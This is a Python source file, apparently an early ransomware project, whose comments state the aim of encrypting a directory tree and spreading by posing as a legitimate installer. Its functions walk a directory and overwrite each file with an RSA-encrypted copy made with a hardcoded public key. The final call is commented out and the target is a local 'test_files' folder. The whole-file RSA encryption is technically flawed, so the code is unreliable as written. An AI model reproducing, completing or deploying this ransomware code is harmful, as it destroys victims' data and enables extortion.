# import libraries 
import os # for file operations
import sys # for command line arguments
import time # for timing the program
from Crypto.PublicKey import RSA #for encryption
from Crypto.Cipher import PKCS1_OAEP #for creating a cipher 


# we want to create a ransomware that will encrypt a given directory and all of its subdirectories recursively
# ideally, we want to encrypt all files except for the ransomware itself
# we want to infect the system by mocking a legitimate program that requires installation of an exe file

# start the attack by asking a user for a directory to encrypt
# we will use the command line arguments to get the directory to encrypt

#encrypting file
def encrypt_file(file_path, public_key):
    with open(file_path, 'rb') as original_file:
        original_content = original_file.read()

    key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(key)
    encrypted_content = cipher.encrypt(original_content)

    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_content)

#scanning directories recursively and encrypting each file
def encrypt_directory(directory, public_key):
    for root, dirs, files in os.walk(directory):
        print(f"Scanning directory: {root}")
        
        for dir in dirs:
            dir_path = os.path.join(root,dir)
            print(f"Found directories: {dir_path}")

        for file in files:
            file_path = os.path.join(root, file)
            print(f"Found file: {file_path}")

            encrypt_file(file_path, public_key)



file_name = os.path.join(os.getcwd(), "test_files")


    # # if the directory does not exist, we will exit the program
if not os.path.exists(file_name):
    print("Directory does not exist")
    sys.exit(1)
    
key = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsmkT5Ex06H/Wc5XOefVEe7ZGW
Do/iCfjef3OQb7tkIzQSOD6A9ndJquJ+RZ/ewMcUkfgJp0uCBnvzyw289d/qg3Dv
W9YbUfmGvB8l1lyrnP1kGZElZO6Hcq9ZRgior49lQBM71XQkPrixx8UPsuZdZoU1
jPyV6KQK88WHCFWzyQIDAQAB
-----END PUBLIC KEY-----"""



    #encrypting the directory

#encrypt_directory(file_name,key)


